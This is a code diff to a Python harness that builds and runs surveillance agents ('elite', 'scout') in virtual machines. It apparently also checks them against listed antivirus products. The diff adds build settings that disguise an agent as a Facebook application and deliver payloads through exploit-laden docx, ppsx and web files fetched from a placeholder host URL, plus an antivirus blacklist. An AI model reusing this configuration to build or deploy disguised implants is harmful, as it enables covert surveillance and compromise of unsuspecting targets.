@@ -614,7 +614,7 @@ def execute_agent(args, level, platform):
     """ starts the vm and execute elite,scout or pull, depending on the level """
     global internet_checked
 
-    ftype = args.platform_type[platform]
+    ftype = args.platform_type
     logging.debug("DBG ftype: %s" % ftype)
 
     vmavtest = AgentBuild(args.backend, args.frontend,
@@ -636,14 +636,15 @@ def execute_agent(args, level, platform):
     else:
         if vmavtest.create_user_machine():
             logging.debug("+ SUCCESS USER CONNECT")
-            if not vmavtest.server_errors():
-                logging.debug("+ SUCCESS SERVER CONNECT")
-                action = {"elite": vmavtest.execute_elite, "scout":
-                          vmavtest.execute_scout, "pull": vmavtest.execute_pull}
-                sleep(5)
-                action[level]()
-            else:
-                logging.debug("+ ERROR SERVER ERRORS")
+            if vmavtest.server_errors():
+                logging.debug("+ WARN SERVER ERRORS")
+
+            logging.debug("+ SUCCESS SERVER CONNECT")
+            action = {"elite": vmavtest.execute_elite, "scout":
+                      vmavtest.execute_scout, "pull": vmavtest.execute_pull}
+            sleep(5)
+            action[level]()
+
         else:
             logging.debug("+ ERROR USER CREATE")
 
@@ -700,19 +701,7 @@ def clean(args):
     vmavtest = AgentBuild(args.backend, args.frontend, args.kind)
     vmavtest._delete_targets(operation)
 
-def build(action, platform, kind, backend, frontend, params):
-
-    platform_desktop = ['windows', 'linux', 'osx', 'exploit',
-                        'exploit_docx', 'exploit_ppsx', 'exploit_web']
-    platform_mobile = ['android', 'blackberry', 'ios']
-    blacklist = "bitdef,comodo,gdata,drweb,emsisoft,sophos,360cn,kis32,avg,avg32".split(',')
-
-    platform_type = {}
-    for v in platform_desktop:
-        platform_type[v] = 'desktop'
-    for v in platform_mobile:
-        platform_type[v] = 'mobile'
-
+def build(action, platform, platform_type, kind, param, backend, frontend, blacklist):
 
     actions = {'scout': scout, 'elite': elite, 'internet':
                internet, 'test': test, 'clean': clean, 'pull': pull}
@@ -727,8 +716,7 @@ def build(action, platform, kind, backend, frontend, params):
     args.kind = kind
     args.backend = backend
     args.frontend = frontend
-    args.params = params
-
+    args.param = param
     args.blacklist=blacklist
     args.platform_type=platform_type
 
@@ -761,7 +749,82 @@ def main():
     else:
         avname = socket.gethostname().replace("win8", "").lower()
 
-    build(args.action, args.platform, args.kind, args.backend, args.frontend)
+    platform_desktop = ['windows', 'linux', 'osx', 'exploit',
+                        'exploit_docx', 'exploit_ppsx', 'exploit_web']
+    platform_mobile = ['android', 'blackberry', 'ios']
+
+    platform_type = {}
+    for v in platform_desktop:
+        platform_type[v] = 'desktop'
+    for v in platform_mobile:
+        platform_type[v] = 'mobile'
+
+    blacklist = "bitdef,comodo,gdata,drweb,emsisoft,sophos,360cn,kis32,avg,avg32".split(',')
+    demo = False
+
+    params = {}
+    params['blackberry'] = {
+    'platform': 'blackberry',
+    'binary': {'demo': demo},
+    'melt': {'appname': 'facebook',
+             'name': 'Facebook Application',
+             'desc': 'Applicazione utilissima di social network',
+             'vendor': 'face inc',
+             'version': '1.2.3'},
+    'package': {'type': 'local'}}
+    params['windows'] = {
+        'platform': 'windows',
+        'binary': {'demo': demo, 'admin': False},
+        'melt': {'scout': True, 'admin': False, 'bit64': True, 'codec': True},
+        'sign': {}
+        }
+    params['android'] = {
+        'platform': 'android',
+        'binary': {'demo': demo, 'admin': False},
+        'sign': {},
+        'melt': {}
+        }
+    params['linux'] = {
+        'platform': 'linux',
+        'binary': {'demo': demo, 'admin': False},
+        'melt': {}
+        }
+    params['osx'] = {'platform': 'osx',
+                     'binary': {'demo': demo, 'admin': True},
+                     'melt': {}
+                     }
+    params['ios'] = {'platform': 'ios',
+                     'binary': {'demo': demo},
+                     'melt': {}
+                     }
+
+    params['exploit'] = {"generate":
+                         {"platforms": ["windows"], "binary": {"demo": False, "admin": False}, "exploit": "HT-2012-001",
+                          "melt": {"demo": False, "scout": True, "admin": False}}, "platform": "exploit", "deliver": {"user": "USERID"},
+                         "melt": {"combo": "txt", "filename": "example.txt", "appname": "agent.exe",
+                                  "input": "000"}, "factory": {"_id": "000"}
+                         }
+
+    params['exploit_docx'] = {"generate":
+                              {"platforms": ["windows"], "binary": {"demo": False, "admin": False}, "exploit": "HT-2013-002",
+                               "melt": {"demo": False, "scout": True, "admin": False}},
+                              "platform": "exploit", "deliver": {"user": "USERID"},
+                              "melt": {"filename": "example.docx", "appname": "APPNAME", "input": "000", "url": "http://HOSTNAME/APPNAME"}, "factory": {"_id": "000"}
+                              }
+    params['exploit_ppsx'] = {"generate":
+                              {"platforms": ["windows"], "binary": {"demo": False, "admin": False}, "exploit": "HT-2013-003",
+                               "melt": {"demo": False, "scout": True, "admin": False}},
+                              "platform": "exploit", "deliver": {"user": "USERID"},
+                              "melt": {"filename": "example.ppsx", "appname": "APPNAME", "input": "000", "url": "http://HOSTNAME/APPNAME"}, "factory": {"_id": "000"}
+                              }
+    params['exploit_web'] = {"generate":
+                             {"platforms": ["windows"], "binary": {"demo": False, "admin": False}, "exploit": "HT-2013-002",
+                              "melt": {"demo": False, "scout": True, "admin": False}},
+                             "platform": "exploit", "deliver": {"user": "USERID"},
+                             "melt": {"filename": "example.docx", "appname": "APPNAME", "input": "000", "url": "http://HOSTNAME/APPNAME"}, "factory": {"_id": "000"}
+                             }
+
+    build(args.action, args.platform, platform_type[args.platform], args.kind, params[args.platform], args.backend, args.frontend,  blacklist )
 
 if __name__ == "__main__":
     import logging.config
